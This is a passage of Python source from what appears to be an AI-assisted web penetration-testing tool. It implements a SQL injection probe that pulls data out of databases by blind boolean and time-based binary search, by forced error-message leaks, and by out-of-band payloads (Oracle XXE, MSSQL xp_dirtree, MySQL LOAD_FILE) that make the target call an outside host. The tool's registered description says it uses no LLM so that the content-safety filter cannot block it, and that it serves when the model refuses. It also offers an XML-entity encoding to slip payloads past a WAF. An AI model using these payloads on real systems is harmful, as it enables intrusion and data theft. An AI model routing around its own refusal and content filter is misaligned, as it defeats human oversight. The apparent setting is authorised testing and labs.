# binary search, a one-shot error-message leak, or an out-of-band callback. All reads are through
# _send_value (same auth + proxy as the default probe); every request lands in history, in-scope.

_MODES = ("blind_boolean", "blind_time", "error_visible", "oast")

# Dialect-specific comparison fragments for the blind binary search. {expr} is the extract_sql,
# {pos} the 1-based char index, {n} the comparison operand. Substituted with str.replace (not
# str.format) so braces inside extract_sql cannot break formatting.
_BLIND_EXTRACT = {
    "postgres": {"length": "LENGTH(({expr}))>{n}",
                 "char_gt": "ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))>{n}"},
    "mysql":    {"length": "LENGTH(({expr}))>{n}",
                 "char_gt": "ASCII(SUBSTRING(({expr}),{pos},1))>{n}"},
    "mssql":    {"length": "LEN(({expr}))>{n}",
                 "char_gt": "ASCII(SUBSTRING(({expr}),{pos},1))>{n}"},
    "oracle":   {"length": "LENGTH(({expr}))>{n}",
                 "char_gt": "ASCII(SUBSTR(({expr}),{pos},1))>{n}"},
}

# One-shot error-leak expression per dialect: forces {expr}'s value into a parseable error message.
# Parsed back with the shared _ERROR_PARSERS from sqli_exploit (same leak extract_db_facts uses).
_ERROR_LEAK = {
    "postgres": "CAST(({expr}) AS int)",
    "mysql":    "extractvalue(1,concat(0x7e,({expr}),0x7e))",
    "mssql":    "CONVERT(int,({expr}))",
    "oracle":   "(SELECT to_number(({expr})) FROM dual)",
}
_DIALECT_TO_PARSER = {"postgres": "PostgreSQL", "mysql": "MySQL", "mssql": "MSSQL", "oracle": "Oracle"}

# Out-of-band egress payload per dialect. {url} = full oob_url, {host} = bare host[:port].
# Oracle uses EXTRACTVALUE + XMLTYPE external-entity (XXE) DNS resolution: it needs only DNS and
# no network ACL, unlike UTL_HTTP.REQUEST which requires a DBMS_NETWORK_ACL_ADMIN grant the target
# DB usually lacks (fails silently, no callback). The XXE form resolves {host} via a DNS lookup.
# Keep this the BARE extractvalue expression (no `(SELECT ... FROM dual)` scalar-subquery wrapper):
# it slots straight into a UNION projection template (`' UNION SELECT {cond} FROM dual-- -` → the
# exact PortSwigger-documented payload) AND still works in a concat template (`'x'||{cond}||''`).
# The old wrapped scalar subquery executed (HTTP 500) but never fired the external-entity DNS fetch
# against a PortSwigger OOB lab; the bare form does. The `FROM dual` now comes from the caller's
# injection_template, not the payload itself.
_OAST_PAYLOAD = {
    "oracle": ("extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
               "<!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{host}/\"> %remote;]>'),'/l')"),
    "mssql":  "exec master..xp_dirtree '//{host}/a'",
    "mysql":  "(SELECT LOAD_FILE(CONCAT('//', '{host}', '/a')))",
}


def _blind_tmpls(dialect: str) -> Dict[str, str]:
    """Blind length/char comparison fragments for a dialect — configured in sqli.yaml
    (blind_extract), with the module defaults as a resilient fallback."""
    y = get_value("sqli", "blind_extract", {}) or {}
    return y.get(dialect) or _BLIND_EXTRACT.get(dialect) or _BLIND_EXTRACT["postgres"]


def _error_leak_tmpl(dialect: str) -> str:
    """Error-leak expression for a dialect — configured in sqli.yaml (error_leak), fallback default."""
    y = get_value("sqli", "error_leak", {}) or {}
    return y.get(dialect) or _ERROR_LEAK.get(dialect) or _ERROR_LEAK["postgres"]


def _oast_tmpl(dialect: str) -> str:
    """OOB egress payload for a dialect — configured in sqli.yaml (oast), fallback default."""
    y = get_value("sqli", "oast", {}) or {}
    return y.get(dialect) or _OAST_PAYLOAD.get(dialect) or _OAST_PAYLOAD["oracle"]


def _apply_cond(template: str, cond: str) -> str:
    """Substitute the {cond} placeholder. Uses str.replace so arbitrary SQL in cond is safe."""
    return template.replace("{cond}", cond)


async def _binary_extract(oracle: "Any", length_tmpl: str, char_tmpl: str, expr: str,
                          max_length: int, ascii_lo: int, ascii_hi: int) -> Dict[str, Any]:
    """Recover a string via a boolean ``oracle(cond_sql) -> bool``: LENGTH binary search, then a
    per-character ASCII binary search. One oracle evaluation == one request; the counter is kept
    by the oracle. Bounded by ``max_length`` and the ASCII span."""
    def _len_cond(n: int) -> str:
        return length_tmpl.replace("{expr}", expr).replace("{n}", str(n))

    def _char_cond(pos: int, n: int) -> str:
        return (char_tmpl.replace("{expr}", expr).replace("{pos}", str(pos)).replace("{n}", str(n)))

    # Length: find the largest n for which LENGTH>n holds, then length = n + 1.
    if not await oracle(_len_cond(0)):
        return {"recovered": "", "length": 0, "per_char": []}
    lo, hi = 0, max(1, int(max_length))
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if await oracle(_len_cond(mid)):
            lo = mid
        else:
            hi = mid - 1
    length = lo + 1

    recovered: List[str] = []
    per_char: List[Dict[str, Any]] = []
    for pos in range(1, length + 1):
        lo, hi = ascii_lo - 1, ascii_hi
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if await oracle(_char_cond(pos, mid)):
                lo = mid
            else:
                hi = mid - 1
        code = lo + 1
        ch = chr(code) if ascii_lo <= code <= ascii_hi else "?"
        recovered.append(ch)
        per_char.append({"pos": pos, "code": code, "char": ch})
    return {"recovered": "".join(recovered), "length": length, "per_char": per_char}


def _ascii_bounds(charset: str) -> "tuple[int, int]":
    """ASCII search bounds from an optional charset string; default printable ASCII 32..126."""
    if charset:
        codes = [ord(c) for c in charset]
        return min(codes), max(codes)
    return 32, 126


def _record_mode_finding(ctx: ToolContext, args: Dict[str, Any], url: str, method: str,
                         point: str, mode: str, evidence: str, extracted: Dict[str, Any]) -> Optional[str]:
    """Best-effort CONFIRMED finding for a successful blind/oast extraction (same store API the
    default path uses). Severity from the arg, else 'high' (a recovered secret / landed callback)."""
    if not (bool(args.get("record", True)) and getattr(ctx, "store", None) is not None):
        return None
    sev = str(args.get("severity", "")).strip().lower()
    severity = sev if sev in _VALID_SEVERITIES else "high"
    finding = {
        "title": str(args.get("title", "")).strip() or f"SQL injection in '{point}' ({mode})",
        "severity": severity,
        "attack_type": "sqli",
        "cwe": str(args.get("cwe", "CWE-89")).strip() or "CWE-89",
        "parameter": point,
        "evidence": evidence,
        "extracted_data": extracted,
        "confirmed": True,
        "confidence": 1.0,
        "validated_by": ["sqli_probe"],
        "source": "copilot",
    }
    try:
        return ctx.store.record_manual_finding(finding, url, method)
    except Exception as exc:
        logger.debug("sqli_probe: mode finding record failed", error=str(exc)[:160])
        return None


async def _mode_blind_boolean(send, args, err_re, point, location, url, method, ctx, mode):
    template = str(args.get("injection_template", ""))
    expr = str(args.get("extract_sql", ""))
    if "{cond}" not in template or not expr:
        return {"ok": False, "error": "blind_boolean needs injection_template with a {cond} "
                "placeholder and extract_sql"}
    dialect = str(args.get("sql_dialect", "postgres")).strip().lower() or "postgres"
    tmpls = _blind_tmpls(dialect)
    true_marker = args.get("true_marker")
    false_marker = args.get("false_marker")
    true_status = args.get("true_status")
    error_oracle = bool(args.get("error_oracle", False))
    if true_marker is None and false_marker is None and true_status is None and not error_oracle:
        return {"ok": False, "error": "blind_boolean needs one oracle: true_marker, false_marker, "
                "true_status, or error_oracle=true"}
    counter = {"n": 0}

    async def oracle(cond_sql: str) -> bool:
        counter["n"] += 1
        resp = await send(_apply_cond(template, cond_sql))
        if resp is None:
            return False
        text = resp.text
        if true_marker is not None:
            return str(true_marker) in text
        if false_marker is not None:
            return str(false_marker) not in text
        if error_oracle:
            return bool(err_re.search(text))
        return resp.status_code == int(true_status)

    max_length = int(args.get("max_length", 64) or 64)
    ascii_lo, ascii_hi = _ascii_bounds(str(args.get("charset", "")))
    out = await _binary_extract(oracle, tmpls["length"], tmpls["char_gt"], expr,
                                max_length, ascii_lo, ascii_hi)
    recovered = out["recovered"]
    verdict = (f"CONFIRMED — blind boolean SQLi in '{point}' ({location}); recovered "
               f"{recovered!r} ({out['length']} chars) in {counter['n']} requests."
               if recovered else
               f"NOT CONFIRMED — blind boolean oracle yielded no data for '{point}' ({location}).")
    entry = _record_mode_finding(ctx, args, url, method, point, mode, verdict,
                                 {"value": recovered}) if recovered else None
    return {"ok": True, "mode": mode, "confirmed": bool(recovered), "recovered": recovered,
            "length": out["length"], "requests": counter["n"], "per_char": out["per_char"],
            "verdict": verdict, "recorded_entry_id": entry}


async def _mode_blind_time(send, args, point, location, url, method, ctx, mode):
    template = str(args.get("injection_template", ""))
    expr = str(args.get("extract_sql", ""))
    if "{cond}" not in template or "{delay}" not in template or not expr:
        return {"ok": False, "error": "blind_time needs injection_template with {cond} AND {delay} "
                "placeholders and extract_sql"}
    dialect = str(args.get("sql_dialect", "postgres")).strip().lower() or "postgres"
    tmpls = _blind_tmpls(dialect)
    delay_s = float(args.get("time_delay", 3) or 3)
    counter = {"n": 0}

    async def _timed(cond_sql: str, delay: float) -> float:
        counter["n"] += 1
        value = _apply_cond(template, cond_sql).replace("{delay}", _fmt_delay(delay))
        t0 = time.monotonic()
        await send(value)
        return (time.monotonic() - t0) * 1000.0

    # Delay-scaling calibration (sqlmap's method, re-implemented over _send_value since
    # probe_common.time_confirm_scaling is typed for CheckTarget/param dicts): a false condition
    # must NOT delay, a true condition must delay ~delay_s, and doubling the sleep must add
    # measurably more. Ambient jitter is uncorrelated with the requested delay and cannot satisfy
    # this, so it rejects a false positive before the (expensive) extraction runs.
    floor_ms = delay_s * 1000.0 * 0.5
    margin_ms = delay_s * 1000.0 * 0.5
    ctrl_ms = await _timed("1=0", delay_s)
    short_ms = await _timed("1=1", delay_s)
    long_ms = await _timed("1=1", delay_s * 2)
    if not ((short_ms - ctrl_ms) >= floor_ms and (long_ms - short_ms) >= margin_ms):
        return {"ok": True, "mode": mode, "confirmed": False, "recovered": "",
                "requests": counter["n"],
                "verdict": f"NOT CONFIRMED — time oracle did not scale (control={ctrl_ms:.0f}ms, "
                           f"short={short_ms:.0f}ms, long={long_ms:.0f}ms); likely network jitter "
                           "or no time-based injection at this point."}
    threshold_ms = ctrl_ms + delay_s * 1000.0 * 0.5

    async def oracle(cond_sql: str) -> bool:
        return await _timed(cond_sql, delay_s) >= threshold_ms

    max_length = int(args.get("max_length", 64) or 64)
    ascii_lo, ascii_hi = _ascii_bounds(str(args.get("charset", "")))
    out = await _binary_extract(oracle, tmpls["length"], tmpls["char_gt"], expr,
                                max_length, ascii_lo, ascii_hi)
    recovered = out["recovered"]
    verdict = (f"CONFIRMED — blind time SQLi in '{point}' ({location}); recovered {recovered!r} "
               f"({out['length']} chars) in {counter['n']} requests (delay={delay_s}s)."
               if recovered else
               f"NOT CONFIRMED — time oracle confirmed but no data recovered for '{point}'.")
    entry = _record_mode_finding(ctx, args, url, method, point, mode, verdict,
                                 {"value": recovered}) if recovered else None
    return {"ok": True, "mode": mode, "confirmed": bool(recovered), "recovered": recovered,
            "length": out["length"], "requests": counter["n"], "per_char": out["per_char"],
            "verdict": verdict, "recorded_entry_id": entry}


def _fmt_delay(delay: float) -> str:
    """Render a sleep duration: integer when whole (pg_sleep(3)), else a short float (0.05)."""
    return str(int(delay)) if float(delay).is_integer() else f"{delay:g}"


async def _mode_error_visible(send, args, point, location, url, method, ctx, mode):
    template = str(args.get("injection_template", ""))
    expr = str(args.get("extract_sql", ""))
    if "{cond}" not in template or not expr:
        return {"ok": False, "error": "error_visible needs injection_template with a {cond} "
                "placeholder and extract_sql"}
    dialect = str(args.get("sql_dialect", "postgres")).strip().lower() or "postgres"
    leak_tmpl = _error_leak_tmpl(dialect)
    parser = _ERROR_PARSERS[_DIALECT_TO_PARSER.get(dialect, "PostgreSQL")]
    leak_expr = leak_tmpl.replace("{expr}", expr)
    resp = await send(_apply_cond(template, leak_expr))
    text = resp.text if resp is not None else ""
    m = parser.search(text)
    recovered = m.group(1) if m else ""
    verdict = (f"CONFIRMED — error-based leak in '{point}' ({location}); recovered {recovered!r} "
               f"via a forced {dialect} error message."
               if recovered else
               f"NOT CONFIRMED — no value leaked in an error message for '{point}' ({location}).")
    entry = _record_mode_finding(ctx, args, url, method, point, mode, verdict,
                                 {"value": recovered}) if recovered else None
    return {"ok": True, "mode": mode, "confirmed": bool(recovered), "recovered": recovered,
            "evidence": text[:300], "verdict": verdict, "recorded_entry_id": entry}


async def _mode_oast(send, args, point, location, url, method, ctx, mode):
    template = str(args.get("injection_template", ""))
    if "{cond}" not in template:
        return {"ok": False, "error": "oast needs injection_template with a {cond} placeholder"}
    dialect = str(args.get("oob_dialect", "oracle")).strip().lower() or "oracle"
    payload_tmpl = _oast_tmpl(dialect)
    oob_host = str(args.get("oob_host", "")).strip()
    if oob_host:
        # Operator-supplied OOB host (e.g. a Burp Collaborator subdomain): inject a callback to
        # THIS host and do NOT poll — the operator checks their own collaborator. No auto-generate,
        # no interactsh session minted, no finding recorded (the hit is unknown to us).
        egress = payload_tmpl.replace("{url}", f"http://{oob_host}/").replace("{host}", oob_host)
        await send(_apply_cond(template, egress))
        return {"ok": True, "mode": mode, "confirmed": None, "hit": None, "oob_host": oob_host,
                "sent": True, "egress": egress,
                "note": "Injected a callback to the operator-supplied OOB host; no auto-poll — "
                        "check your own collaborator for the DNS/HTTP interaction.",
                "verdict": f"SENT — OOB payload delivered to {oob_host}; verify the interaction "
                           f"in your collaborator."}
    from dast.tools.oob_tools import _oob_generate, _oob_poll
    gen = await _oob_generate(ctx, {"origin_url": url, "origin_method": method,
                                    "origin_param": point})
    if not gen.get("ok"):
        return {"ok": False, "error": f"oob_generate failed: {gen.get('error')}"}
    oob_url = str(gen.get("oob_url", ""))
    oob_id = str(gen.get("id", ""))
    parsed = urlparse(oob_url if "://" in oob_url else f"http://{oob_url}")
    host = parsed.netloc or parsed.path
    egress = payload_tmpl.replace("{url}", oob_url).replace("{host}", host)
    await send(_apply_cond(template, egress))
    try:
        wait_seconds = int(args.get("wait_seconds", 15))
    except (TypeError, ValueError):
        wait_seconds = 15
    poll = await _oob_poll(ctx, {"id": oob_id, "wait_seconds": wait_seconds})
    hit = bool(poll.get("hit"))
    note = ("MySQL LOAD_FILE OOB egress is frequently blocked (secure_file_priv, Linux UNC); a "
            "missing callback is NOT conclusive for MySQL." if dialect == "mysql" else "")
    verdict = (f"CONFIRMED — out-of-band SQLi in '{point}' ({location}); the target reached the OOB "
               f"host ({poll.get('count')} interaction(s))." if hit else
               f"NOT CONFIRMED — no OOB callback for '{point}' ({location}) within {wait_seconds}s.")
    entry = _record_mode_finding(ctx, args, url, method, point, mode, verdict,
                                 {"oob_url": oob_url}) if hit else None
    return {"ok": True, "mode": mode, "confirmed": hit, "hit": hit, "oob_url": oob_url,
            "oob_id": oob_id, "interactions": poll.get("interactions", []),
            "note": note, "verdict": verdict, "recorded_entry_id": entry}


async def _run_mode(mode: str, ctx: ToolContext, args: Dict[str, Any], send_value, err_re,
                    *, location: str, point: str, url: str, method: str) -> Dict[str, Any]:
    """Dispatch an opt-in extraction mode. Opens one proxied client (same settings as the default
    probe) and binds send_value to it, so every mode routes through the same auth + proxy + scope."""
    if mode not in _MODES:
        return {"ok": False, "error": f"mode must be one of {_MODES} or '' for the default probe"}
    import httpx
    try:
        async with httpx.AsyncClient(proxy=ctx.proxy_url, verify=False,
                                     follow_redirects=False, timeout=60) as client:
            async def send(value: str) -> Optional["httpx.Response"]:
                return await send_value(client, value)
            if mode == "blind_boolean":
                return await _mode_blind_boolean(send, args, err_re, point, location, url, method,
                                                 ctx, mode)
            if mode == "blind_time":
                return await _mode_blind_time(send, args, point, location, url, method, ctx, mode)
            if mode == "error_visible":
                return await _mode_error_visible(send, args, point, location, url, method, ctx, mode)
            # oast
            return await _mode_oast(send, args, point, location, url, method, ctx, mode)
    except Exception as exc:
        return {"ok": False, "error": f"mode {mode} failed: {str(exc)[:200]}", "mode": mode}


register(Tool(
    name="sqli_probe",
    description=(
        "Deterministically probe ONE parameter or GraphQL variable for SQL injection — no LLM, so "
        "the gateway's content-safety filter cannot block it. Sends static error-based then "
        "time-based payloads, detects a NEW SQL-error / GraphQL-error differential or a timing "
        "delay vs a baseline, and on a hit extracts a read-only version()/database()/user() proof. "
        "Records a CONFIRMED finding with the full step chain + extracted facts as evidence. "
        "injection_location: 'graphql_var' (inject into a GraphQL variable; the "
        "captured operation body is reused if you don't pass one), 'query', or 'body'. Cookies come "
        "from the proxy jar automatically; everything routes through the proxy. "
        "Use this to validate a suspected SQLi reliably, or when the LLM payload path refuses. "
        "For a BLIND injection with no in-band error, set mode: 'blind_boolean' (boolean oracle), "
        "'blind_time' (time oracle), 'error_visible' (one-shot error-message leak), or 'oast' "
        "(out-of-band callback) to deterministically extract data char-by-char — far more reliable "
        "than hand-driving the binary search via send_request. Also supports a 'cookie' "
        "injection_location for injectable-cookie labs, and an 'xml_body' location that injects "
        "into a named element of an XML request body. Set encode='xml_entities' to smuggle the "
        "payload past a keyword-matching WAF via XML numeric-character-reference encoding (the "
        "server XML-decodes before the SQL runs). Default mode is the in-band probe."
    ),
    input_schema=_SCHEMA,
    handler=_sqli_probe,
    tags=["active", "write"],
))
